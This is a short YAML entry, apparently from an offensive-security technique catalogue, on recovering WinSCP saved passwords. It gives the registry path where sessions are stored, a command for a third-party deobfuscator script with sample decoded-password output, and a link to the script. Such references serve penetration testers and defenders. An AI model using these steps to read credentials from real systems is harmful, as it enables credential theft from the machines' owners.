---
functions:
  enumeration:
    - description: Decode Saved Passwords
      code: |
           Required registry keys
        HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\*
        > python winscp-deobfuscator.py --hostname <ip> --username <username> --hash <encoded value>
          ==================================================
                WinSCP deobfuscation from command line      
          ==================================================
                          Host: ip
                          User: username
                      Password: decodedvalue
          --------------------------------------------------

resources: |
  https://github.com/unkn0wnsyst3m/scripts/blob/master/winscp-deobfuscator.py
---
